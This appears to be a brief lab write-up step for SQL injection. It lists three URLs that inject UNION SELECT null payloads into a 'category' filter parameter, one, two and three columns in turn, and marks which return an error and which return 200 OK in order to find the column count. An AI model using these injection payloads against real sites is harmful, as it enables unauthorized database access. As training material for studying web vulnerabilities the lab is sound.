### Just add the third query in the url bar

```
/filter?category=Pets'+UNION+SELECT+null--            #Error response
/filter?category=Pets'+UNION+SELECT+null,null--       #Error response
/filter?category=Pets'+UNION+SELECT+null,null,null--  #200 OK
```
